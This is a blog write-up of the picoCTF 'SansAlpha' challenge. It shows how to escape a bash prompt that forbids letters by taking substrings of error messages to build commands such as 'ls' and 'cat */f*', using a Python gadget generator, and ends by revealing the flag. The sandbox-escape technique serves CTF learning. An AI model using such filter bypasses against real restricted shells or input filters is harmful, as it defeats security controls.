<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>PicoCTF SansAlpha Writeup - lavafroth</title><meta name=description content='Hey everyone, since 2024 hasn&rsquo;t seen a lot of posts on this blog, I plan to
start this year off by going back to the roots.
I&rsquo;ll be focusing on posting more CTF writeups again! Today&rsquo;s challenge is
SansAlpha from PicoCTF. The challenge description states

The Multiverse is within your grasp! Unfortunately, the server that contains
the secrets of the multiverse is in a universe where keyboards only have numbers
and (most) symbols.'><meta name=author content><link rel="preload stylesheet" as=style href=https://lavafroth.is-a.dev/app.min.css><link rel=preload as=image href=../../header.svg><link as=font href=https://lavafroth.is-a.dev/latinmodern-math.otf><link rel=preload as=image href=https://lavafroth.is-a.dev/github.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/about.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/art.svg><link rel=preload as=image href=https://lavafroth.is-a.dev/rss.svg><link rel=icon href=https://lavafroth.is-a.dev/favicon.png><link rel=blog-icon href=https://lavafroth.is-a.dev/icon.png></head><body><header><a class=site-name href=https://lavafroth.is-a.dev/><svg viewBox="0 0 8790 2400"><path d="M80 1935V465h216v1270h286v2e2zm853 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm1025 528L2014 465h210l108 868 8 142h12l8-142 108-868h210l-224 1470zm813 0 222-1470h264l222 1470h-210l-40-3e2h-208l-40 3e2zm280-528h148l-62-494-6-78h-12l-6 78zm851 528V465h514v222h-298v386h2e2v222h-2e2v640zm910 0V465h216q194 0 286 108 92 107 92 316 0 124-43 215-44 90-106 132l147 699h-216l-122-620h-38v620zm216-820q60 0 95-26 35-27 50-76t15-116q0-105-34-161-35-57-126-57zm1084 836q-90 0-154-42-65-42-99-114-35-72-35-162V767q0-91 35-162 34-72 99-114 64-42 154-42t155 42q64 42 99 114 34 72 34 162v866q0 90-34 162-35 72-99 114-65 42-155 42zm0-210q40 0 56-33 16-34 16-75V767q0-41-17-74-17-34-55-34-37 0-54 34-18 33-18 74v866q0 41 17 75 17 33 55 33zm890 194V687h-204V465h624v222h-204v1248zm828 0V465h216v608h168V465h216v1470h-216v-640h-168v640z"/></svg></a><nav><a style=--url:url(./github.svg) href=https://github.com/lavafroth aria-label=github target=_blank></a><a href=../../about/ aria-label=about style=--url:url(./about.svg)></a><a href=../../art/ aria-label=art style=--url:url(./art.svg)></a><a href=../../index.xml aria-label=rss style=--url:url(./rss.svg)></a><nav></header><main><article class=post-single data-pagefind-body><hgroup><p data-pagefind-ignore><time>Jan 5, 2025 | 7 minutes read</time></p><h1 data-pagefind-meta=title>PicoCTF SansAlpha Writeup</h1></hgroup><section class=post-content><p>Hey everyone, since 2024 hasn&rsquo;t seen a lot of posts on this blog, I plan to
start this year off by going back to the roots.</p><p>I&rsquo;ll be focusing on posting more CTF writeups again! Today&rsquo;s challenge is
<em>SansAlpha</em> from PicoCTF. The challenge description states</p><blockquote><p>The Multiverse is within your grasp! Unfortunately, the server that contains
the secrets of the multiverse is in a universe where keyboards only have numbers
and (most) symbols.</p></blockquote><p>It is tagged as a <em>shell escape</em>, which means we will be dropped in a restricted
environment and our job would be to break out of the sandbox.</p><p>After launching and remoting into the machine with the given credentials, we are
greeted with a bash prompt.</p><pre tabindex=0><code>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the &#39;unminimize&#39; command.
Last login: Sun Jan  5 06:15:52 2025 from 127.0.0.1
SansAlpha$
</code></pre><p>The moment we issue a command, however, we get an error saying an unknown character was detected.</p><pre tabindex=0><code>SansAlpha$ id
SansAlpha: Unknown character detected
</code></pre><p>However, numerals and symbols still work. So we can still perform basic arithmetic like the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#66d9ef>$((</span><span style=color:#ae81ff>1</span><span style=color:#f92672>+</span><span style=color:#ae81ff>2</span><span style=color:#66d9ef>))</span>
</span></span></code></pre></div><pre tabindex=0><code>bash: 3: command not found
</code></pre><p>Now the description makes more sense, we are only allowed to use numbers and
symbols as the input. Alphabets are forbidden, hence the title, <em>sans alpha</em>.</p><p>The hint for the challenge says</p><blockquote><p>Where can you get some letters?</p></blockquote><p>We could get some letters perhaps by reading a file. To do that, we still need
to use some utility like <code>cat</code> and we need to supply a known filename.</p><p>Surprisingly enough, we can still trigger a division by zero error.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#66d9ef>$((</span><span style=color:#ae81ff>1</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span><span style=color:#66d9ef>))</span>
</span></span></code></pre></div><pre tabindex=0><code>bash: 1/0: division by 0 (error token is &#34;0&#34;)
</code></pre><p>But of course, we can get some letters from the <em>errors!</em></p><p>Here&rsquo;s an outline of our plan:</p><ul><li>Perform a command substitution with the <code>$(somecommand)</code> notation inside a string</li><li>Ensure that the command substition returns an error</li><li>Use the letters or substrings from the error for the next payload</li></ul><p>We&rsquo;ll run the commands on a local machine first to make sure the outputs match our expectations.</p><p>Let&rsquo;s continue with the division by zero example. We want to perform this division inside
a subshell as a string substitution.</p><blockquote><p>Note: the syntax highlighter on my website is freaking out on this command.<br>The perfect bash highlighter doesn&rsquo;t exist.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span> <span style=color:#f92672>((</span>1/0<span style=color:#66d9ef>)</span><span style=color:#e6db74>) )&#34;</span>
</span></span></code></pre></div><p>The inner two pairs of braces are performing the math. The outermost braces are
performing the command substitution. Thus, we are passing the arithmetic error
string <code>1/0: division by 0 (error token is "0")</code> as the command to be run.</p><p>We can check this by asking bash for the most recent command using the special
variable <code>$_</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>echo $_
</span></span></code></pre></div><p>Which gives us &mldr; nothing? Well, that&rsquo;s because the error is being printed on
standard error <code>stderr</code> instead of the standard output <code>stdout</code>.</p><p>To pass the error as the next command to be evaluated, we need to redirect
<code>stderr</code> at file descriptor 2 to <code>stdout</code> at file descriptor 1 with a <code>2>&amp;1</code>
expression.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span> <span style=color:#f92672>((</span>1/0<span style=color:#66d9ef>)</span><span style=color:#e6db74>) 2&gt;&amp;1 )&#34;</span>
</span></span></code></pre></div><p>Now looking up the last command returns the error message.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>echo $_
</span></span></code></pre></div><pre tabindex=0><code>bash: ((: 1/0: division by 0 (error token is &#34;0&#34;)
</code></pre><h2 id=triggering-a-text-editor>Triggering a text editor</h2><p>We can follow up with a substring from this error. The syntax for picking a substring in bash is
a bit different from other languages. It is of the form</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>${</span>variable:offset:length<span style=color:#e6db74>}</span>
</span></span></code></pre></div><ul><li>The <code>variable</code>, in our case <code>_</code>, is what stores the original string</li><li><code>offset</code> is where the substring begins</li><li><code>length</code> is how far the substring goes from the start</li></ul><p>In fact, the di<strong>vi</strong>sion error message contains the substring <code>vi</code> which we could use to spin up the <code>vi</code> text editor.
To get that substring, we find its index. Let&rsquo;s use the index method in python for this.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e6db74>&#39;bash: ((: 1/0: division by 0 (error token is &#34;0&#34;)&#39;</span><span style=color:#f92672>.</span>index(<span style=color:#e6db74>&#39;vi&#39;</span>)
</span></span></code></pre></div><p>This gives us 17. Knowing that <code>vi</code> is 2 letters, we can build the following payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>${</span>_:17:2<span style=color:#e6db74>}</span>
</span></span></code></pre></div><p>Since this payload depends on the error before it, we must detonate that first.
We will run the following on the picoCTF machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$((</span><span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span><span style=color:#66d9ef>))</span><span style=color:#e6db74> 2&gt;&amp;1)&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>_:17:2<span style=color:#e6db74>}</span>
</span></span></code></pre></div><pre tabindex=0><code>bash: bash: ((: 1/0: division by 0 (error token is &#34;0&#34;): No such file or directory
bash: vi: command not found
</code></pre><p>Looks like one of the most ubiquitous text editors isn&rsquo;t available on this machine!</p><p>If we were to successfully launch <code>vi</code>, we could type the sequence <code>:!</code> followed
by a command to execute it in a shell.</p><h2 id=getting-a-lay-of-the-land>Getting a lay of the land</h2><p>We can still gather letters from other error messages. Let&rsquo;s take a look around
to get a feel for where the flag might be. To list the contents of the current
directory, we need to run the <code>ls</code> command.</p><p>As there&rsquo;s no letter &rsquo;l&rsquo; in the division by zero error, we could trigger a
different error like trying to source a nonexistent file like <code>1</code> using the
dot command.</p><pre tabindex=0><code>&#34;$(. 1 2&gt;&amp;1)&#34;
</code></pre><pre tabindex=0><code>bash: 1: No such file or directory
</code></pre><h2 id=building-gadgets>Building gadgets</h2><p>We can use the same substring technique as in the previous section to extract
characters from the error message. To automate this, we create a small python
function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate</span>(haystack: str, to_build: str):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;${{_:</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>:1}}&#34;</span><span style=color:#f92672>.</span>format(
</span></span><span style=display:flex><span>            haystack<span style=color:#f92672>.</span>index(needle)
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> needle <span style=color:#f92672>in</span> to_build
</span></span><span style=display:flex><span>    )
</span></span></code></pre></div><ul><li><code>haystack</code> refers to the error message wherein we look for the letters</li><li><code>needle</code> represents each letter that come together <code>to_build</code> the command we want to issue.</li></ul><p>The outputs of such small functions that work together to build a larger exploit
are call <em>&ldquo;gadgets&rdquo;</em>.</p><h2 id=chaining-gadgets>Chaining gadgets</h2><p>We can call the function like the following to build the payload for calling <code>ls</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;bash: 1: No such file or directory&#39;</span>
</span></span><span style=display:flex><span>generate(msg, <span style=color:#e6db74>&#39;ls&#39;</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>${</span>_:19:1<span style=color:#e6db74>}${</span>_:2:1<span style=color:#e6db74>}</span>
</span></span></code></pre></div><p>Let&rsquo;s use this immediately after detonating the sourcing error.
Putting everything together, we&rsquo;ll run the following payload on the picoCTF machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>. <span style=color:#ae81ff>1</span> 2&gt;&amp;1<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>_:19:1<span style=color:#e6db74>}${</span>_:2:1<span style=color:#e6db74>}</span>
</span></span></code></pre></div><pre tabindex=0><code>bash: bash: 1: No such file or directory: command not found
blargh    on-calastran.txt
</code></pre><p>We find a directory called &ldquo;blargh&rdquo; and a text file called &ldquo;on-calastran.txt&rdquo; in
our working directory. Let&rsquo;s try to list the contents of the <code>blargh</code> directory
using <code>ls blargh</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>generate(msg, <span style=color:#e6db74>&#39;ls blargh&#39;</span>)
</span></span></code></pre></div><pre tabindex=0><code>Traceback (most recent call last):
  File &#34;&lt;stdin&gt;&#34;, line 1, in &lt;module&gt;
  File &#34;&lt;stdin&gt;&#34;, line 2, in generate
  File &#34;&lt;stdin&gt;&#34;, line 3, in &lt;genexpr&gt;
ValueError: substring not found
</code></pre><p>Why are we unable to generate a payload for this command? If we look closely, we
see this happens because the letter &lsquo;g&rsquo; is not in the error message.</p><h2 id=globbing-to-the-rescue>Globbing to the rescue</h2><p>We can always resort to globbing with <code>*/**</code>, matching all paths at depth 2. We
simply need to append it to the previous payload since special characters work
just fine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>. <span style=color:#ae81ff>1</span> 2&gt;&amp;1<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>_:19:1<span style=color:#e6db74>}${</span>_:2:1<span style=color:#e6db74>}</span> */**
</span></span></code></pre></div><p>Running this on the picoCTF machine tells us that the flag resides in the
&ldquo;blargh&rdquo; directory.</p><pre tabindex=0><code>blargh/flag.txt  blargh/on-alpha-9.txt
</code></pre><p>We can view the contents of <code>flag.txt</code> using the <code>cat</code> utility.</p><p>To avoid matching the other <code>on-alpha-9.txt</code> file and printing its contents,
we can distinguish the <code>flag.txt</code> by its first letter &lsquo;f&rsquo; in the glob. Thus, to
view the flag, our target command will be <code>cat */f*</code>.</p><p>Let&rsquo;s generate the gadget for this round.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>print(generate(msg, <span style=color:#e6db74>&#39;cat&#39;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; */&#34;</span> <span style=color:#f92672>+</span> generate(msg, <span style=color:#e6db74>&#34;f&#34;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;*&#34;</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>${</span>_:14:1<span style=color:#e6db74>}${</span>_:1:1<span style=color:#e6db74>}${</span>_:30:1<span style=color:#e6db74>}</span> */<span style=color:#e6db74>${</span>_:17:1<span style=color:#e6db74>}</span>*    
</span></span></code></pre></div><p>We will append this to the first gadget and run them together.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>. <span style=color:#ae81ff>1</span> 2&gt;&amp;1<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>${</span>_:14:1<span style=color:#e6db74>}${</span>_:1:1<span style=color:#e6db74>}${</span>_:30:1<span style=color:#e6db74>}</span> */<span style=color:#e6db74>${</span>_:17:1<span style=color:#e6db74>}</span>*    
</span></span></code></pre></div><p>Running this on the picoCTF machine finally fetches us the flag!</p><pre tabindex=0><code>return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_b0d5e855}
</code></pre><p>I really enjoy coming back to these CTF challenges because they force you to
think out of the box.</p><p>That&rsquo;s all for now. I hope you learned something. See you soon!</p></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/picoctf class=list-tag>PicoCTF</a>
<a href=https://lavafroth.is-a.dev/tags/bash class=list-tag>Bash</a>
<a href=https://lavafroth.is-a.dev/tags/sandbox-escape class=list-tag>Sandbox Escape</a>
<a href=https://lavafroth.is-a.dev/tags/python class=list-tag>Python</a>
<a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a></footer><nav class=post-nav><a class=prev href=https://lavafroth.is-a.dev/post/project-mana-demo/><span>←</span><span>Building an in-browser Manim clone</span></a>
<a class=next href=https://lavafroth.is-a.dev/post/a-tale-of-a-frugal-home-server/><span>A Tale of a Frugal Home Server</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>